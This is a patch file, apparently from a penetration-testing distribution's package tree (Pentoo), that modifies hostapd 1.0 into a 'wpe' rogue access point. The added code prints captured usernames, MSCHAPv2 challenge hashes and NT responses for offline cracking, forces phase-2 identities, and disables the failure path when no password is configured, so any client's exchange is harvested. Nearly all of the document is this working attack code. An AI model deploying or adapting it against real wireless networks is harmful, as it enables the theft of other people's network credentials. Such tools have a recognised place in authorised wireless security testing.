@@ -1,0 +1,157 @@
+diff -urN hostapd-1.0.orig/hostapd/main.c hostapd-1.0/hostapd/main.c
+--- hostapd-1.0.orig/hostapd/main.c	2013-05-01 22:58:03.007738503 +0800
++++ hostapd-1.0/hostapd/main.c	2013-05-01 22:49:55.000000000 +0800
+@@ -512,7 +512,7 @@
+ static void show_version(void)
+ {
+ 	fprintf(stderr,
+-		"hostapd v" VERSION_STR "\n"
++		"hostapd v" VERSION_STR" with wpe support (Pentoo)\n"
+ 		"User space daemon for IEEE 802.11 AP management,\n"
+ 		"IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator\n"
+ 		"Copyright (c) 2002-2012, Jouni Malinen <j@w1.fi> "
+diff -urN hostapd-1.0.orig/src/crypto/ms_funcs.c hostapd-1.0/src/crypto/ms_funcs.c
+--- hostapd-1.0.orig/src/crypto/ms_funcs.c	2012-05-10 05:56:09.000000000 +0800
++++ hostapd-1.0/src/crypto/ms_funcs.c	2013-05-01 22:49:55.000000000 +0800
+@@ -83,7 +83,7 @@
+  * @challenge: 8-octet Challenge (OUT)
+  * Returns: 0 on success, -1 on failure
+  */
+-static int challenge_hash(const u8 *peer_challenge, const u8 *auth_challenge,
++int challenge_hash(const u8 *peer_challenge, const u8 *auth_challenge,
+ 			  const u8 *username, size_t username_len,
+ 			  u8 *challenge)
+ {
+diff -urN hostapd-1.0.orig/src/crypto/ms_funcs.h hostapd-1.0/src/crypto/ms_funcs.h
+--- hostapd-1.0.orig/src/crypto/ms_funcs.h	2012-05-10 05:56:09.000000000 +0800
++++ hostapd-1.0/src/crypto/ms_funcs.h	2013-05-01 22:49:55.000000000 +0800
+@@ -37,6 +37,10 @@
+ int nt_challenge_response(const u8 *challenge, const u8 *password,
+ 			  size_t password_len, u8 *response);
+ 
++int challenge_hash(const u8 *peer_challenge, const u8 *auth_challenge,
++                          const u8 *username, size_t username_len,
++                          u8 *challenge);
++
+ void challenge_response(const u8 *challenge, const u8 *password_hash,
+ 			u8 *response);
+ int nt_password_hash(const u8 *password, size_t password_len,
+diff -urN hostapd-1.0.orig/src/crypto/tls_openssl.c hostapd-1.0/src/crypto/tls_openssl.c
+--- hostapd-1.0.orig/src/crypto/tls_openssl.c	2012-05-10 05:56:09.000000000 +0800
++++ hostapd-1.0/src/crypto/tls_openssl.c	2013-05-01 22:49:55.000000000 +0800
+@@ -2642,7 +2642,7 @@
+ 				       data_len) != 1)
+ 		return -1;
+ #else /* CONFIG_OPENSSL_TICKET_OVERRIDE */
+-	if (SSL_set_hello_extension(conn->ssl, ext_type, (void *) data,
++	if (SSL_set_session_ticket_ext(conn->ssl, ext_type, (void *) data,
+ 				    data_len) != 1)
+ 		return -1;
+ #endif /* CONFIG_OPENSSL_TICKET_OVERRIDE */
+@@ -2948,7 +2948,7 @@
+ 		SSL_set_tlsext_debug_callback(conn->ssl, tls_hello_ext_cb);
+ 		SSL_set_tlsext_debug_arg(conn->ssl, conn);
+ #else /* SSL_OP_NO_TICKET */
+-		if (SSL_set_hello_extension_cb(conn->ssl, tls_hello_ext_cb,
++		if (SSL_set_session_ticket_ext_cb(conn->ssl, tls_hello_ext_cb,
+ 					       conn) != 1)
+ 			return -1;
+ #endif /* SSL_OP_NO_TICKET */
+@@ -2963,7 +2963,7 @@
+ 		SSL_set_tlsext_debug_callback(conn->ssl, NULL);
+ 		SSL_set_tlsext_debug_arg(conn->ssl, conn);
+ #else /* SSL_OP_NO_TICKET */
+-		if (SSL_set_hello_extension_cb(conn->ssl, NULL, NULL) != 1)
++		if (SSL_set_session_ticket_ext_cb(conn->ssl, NULL, NULL) != 1)
+ 			return -1;
+ #endif /* SSL_OP_NO_TICKET */
+ #endif /* CONFIG_OPENSSL_TICKET_OVERRIDE */
+diff -urN hostapd-1.0.orig/src/eap_server/eap_server.c hostapd-1.0/src/eap_server/eap_server.c
+--- hostapd-1.0.orig/src/eap_server/eap_server.c	2013-05-01 22:58:03.010738503 +0800
++++ hostapd-1.0/src/eap_server/eap_server.c	2013-05-01 22:54:51.000000000 +0800
+@@ -102,8 +102,9 @@
+ 		 int phase2)
+ {
+ 	struct eap_user *user;
+-    char *username = NULL;
+-    char *message = NULL;
++	char *username = NULL;
++	char *message = NULL;
++	char ident = 't';
+ 
+ 	eap_user_free(sm->user);
+ 	sm->user = NULL;
+@@ -112,6 +113,11 @@
+ 	if (user == NULL)
+ 	    return -1;
+ 
++	if(phase2) {
++		identity = (const u8 *)&ident;
++		identity_len = 1;
++	}
++
+     /* Karma EAP Modifications */
+     if (karma_eap_auth) {
+         /* Karma Mode: Accept all requests, regardless of username - JoMo-Kun <jmk@foofus.net> */ 
+diff -urN hostapd-1.0.orig/src/eap_server/eap_server_fast.c hostapd-1.0/src/eap_server/eap_server_fast.c
+--- hostapd-1.0.orig/src/eap_server/eap_server_fast.c	2012-05-10 05:56:09.000000000 +0800
++++ hostapd-1.0/src/eap_server/eap_server_fast.c	2013-05-01 22:49:55.000000000 +0800
+@@ -1040,7 +1040,8 @@
+ 
+ 	switch (data->state) {
+ 	case PHASE2_ID:
+-		if (eap_user_get(sm, sm->identity, sm->identity_len, 1) != 0) {
++		//if (eap_user_get(sm, sm->identity, sm->identity_len, 1) != 0) {
++		if (eap_user_get(sm, sm->identity, sm->identity_len, 0) != 0) {
+ 			wpa_hexdump_ascii(MSG_DEBUG, "EAP-FAST: Phase2 "
+ 					  "Identity not found in the user "
+ 					  "database",
+diff -urN hostapd-1.0.orig/src/eap_server/eap_server_mschapv2.c hostapd-1.0/src/eap_server/eap_server_mschapv2.c
+--- hostapd-1.0.orig/src/eap_server/eap_server_mschapv2.c	2013-05-01 22:58:03.011738503 +0800
++++ hostapd-1.0/src/eap_server/eap_server_mschapv2.c	2013-05-01 22:56:30.000000000 +0800
+@@ -295,9 +295,10 @@
+ 	u8 flags;
+ 	size_t len, name_len, i;
+ 	u8 expected[24];
++	u8 challenge_hash1[8];
+ 	const u8 *username, *user;
+ 	size_t username_len, user_len;
+-	int res;
++	int res, x;
+ 	char *auth_creds = NULL;
+ 	int auth_creds_len = 0;
+ 
+@@ -338,6 +339,22 @@
+ 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: NT-Response", nt_response, 24);
+ 	wpa_printf(MSG_MSGDUMP, "EAP-MSCHAPV2: Flags 0x%x", flags);
+ 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Name", name, name_len);
++	
++	challenge_hash(peer_challenge, data->auth_challenge, name, name_len, challenge_hash1);
++
++	wpa_hexdump(MSG_DEBUG, "EAP-MSCHAPV2: Challenge Hash", challenge_hash1, 8);
++	printf("\n");
++	printf("\tusername: %s\n", name);
++	printf("\tchallenge: ");
++	for (x=0;x<7;x++)
++                printf("%02x:",challenge_hash1[x]);
++        printf("%02x\n",challenge_hash1[7]);
++
++        printf("\tresponse: ");
++        for (x=0;x<23;x++)
++                printf("%02x:",nt_response[x]);
++        printf("%02x\n",nt_response[23]);
++
+ 
+ 	/* Karma Mode: Log MSCHAPv2 exchange in John format - JoMo-Kun <jmk@foofus.net> */  
+ 	/* user::domain (unused):authenticator challenge:mschapv2 response:peer challenge */ 
+@@ -524,8 +541,8 @@
+ 
+ 	if (sm->user == NULL || sm->user->password == NULL) {
+ 		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Password not configured");
+-		data->state = FAILURE;
+-		return;
++		//data->state = FAILURE;
++		//return;
+ 	}
+ 
+ 	switch (data->state) {
